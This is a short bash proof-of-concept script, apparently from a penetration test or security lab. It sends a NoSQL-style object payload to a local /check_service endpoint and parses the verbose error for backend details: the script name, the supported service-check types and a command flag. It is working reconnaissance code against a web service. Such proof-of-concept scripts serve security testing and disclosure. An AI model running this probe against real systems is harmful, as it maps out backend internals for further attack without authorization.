#!/bin/bash

# POC: Information Disclosure - Backend Shell Script Details Exposed
# This demonstrates how sending invalid parameter types (objects/arrays) 
# instead of strings triggers error messages that reveal backend implementation details

TARGET_URL="http://127.0.0.1:80/check_service"
CONTENT_TYPE="Content-Type: application/json"

echo "=== Information Disclosure POC: Backend Shell Script Details ==="
echo ""
echo "Target: $TARGET_URL"
echo "Technique: Send object parameter instead of string to trigger verbose error"
echo ""

# Test 1: Send service_name as object (invalid type)
echo "[*] Test 1: Sending service_name as object..."
echo "Payload: {\"service_name\":{\"\\$gt\":\"\"}}"
echo ""

RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "$CONTENT_TYPE" \
  -d '{"service_name":{"$gt":""}}')

echo "Response:"
echo "$RESPONSE" | jq . 2>/dev/null || echo "$RESPONSE"
echo ""

# Extract and display the exposed information
if echo "$RESPONSE" | grep -q "check_service.sh"; then
    echo "[+] VULNERABILITY CONFIRMED: Backend script name exposed!"
    echo ""
    
    # Extract the status field which contains the error message
    EXPOSED_INFO=$(echo "$RESPONSE" | jq -r '.status' 2>/dev/null)
    
    if [ ! -z "$EXPOSED_INFO" ] && [ "$EXPOSED_INFO" != "null" ]; then
        echo "=== EXPOSED BACKEND INFORMATION ==="
        echo "$EXPOSED_INFO" | sed 's/\\n/\n/g'
        echo ""
        echo "=== INFORMATION DISCLOSED ==="
        echo "[!] Backend script: check_service.sh"
        if echo "$EXPOSED_INFO" | grep -q "systemctl"; then
            echo "[!] Available type: systemctl (default)"
        fi
        if echo "$EXPOSED_INFO" | grep -q "ps"; then
            echo "[!] Available type: ps"
        fi
        if echo "$EXPOSED_INFO" | grep -q "custom"; then
            echo "[!] Available type: custom"
        fi
        if echo "$EXPOSED_INFO" | grep -q "\-t type"; then
            echo "[!] Supported option: -t (for setting type)"
        fi
        if echo "$EXPOSED_INFO" | grep -q "Usage:"; then
            echo "[!] Usage examples provided in error message"
        fi
        echo ""
        exit 0
    fi
fi

echo "[-] Vulnerability not triggered or response format unexpected"
exit 1